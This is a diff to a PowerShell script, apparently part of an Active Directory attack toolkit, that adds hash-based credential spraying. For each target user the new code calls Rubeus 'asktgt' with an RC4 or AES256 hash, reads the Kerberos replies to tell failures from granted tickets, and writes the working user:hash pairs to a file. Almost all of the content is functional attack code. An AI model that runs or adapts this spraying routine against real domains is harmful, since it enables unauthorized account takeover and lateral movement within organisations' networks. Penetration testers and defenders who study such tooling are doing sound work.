@@ -3338,6 +3338,16 @@ Write-Output " - Lockout Threshold  : $LO_threshold"
 Write-Output " - Safety Limit value : $SafeLimit"
 Write-Output " - Removed disabled accounts from spraying"
 
+if ($Hash -ne ""){
+    $Password = ""
+    $AccountAsPassword = $False
+
+    Write-Host
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Spraying with Hash value: $Hash"
+    Write-Host
+
+}
 
 if ($Password -ne ""){
     $Hash = ""
@@ -3393,6 +3403,32 @@ $searchResult = $searcher.FindOne()
     }
 }
 
+            if ($Hash -ne $null){
+            
+            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
+            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
+            
+            # Check for Unhandled Rubeus exception
+            if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
+                if (!$SuccessOnly){
+                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                    Write-Host "$Domain\$UserToSpray"
+         }    
+            } 
+            # Check for KDC_ERR_PREAUTH_FAILED
+            elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
+                if (!$SuccessOnly){
+                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                    Write-Host "$Domain\$UserToSpray"
+         }   
+            }
+            # Check for TGT request success
+            elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
+                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                Write-Host "$Domain\$UserToSpray"
+                "$Domain\${UserToSpray}:$Hash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
+        }
+    }
 
     # Password Spraying
    if ($Password -ne ""){
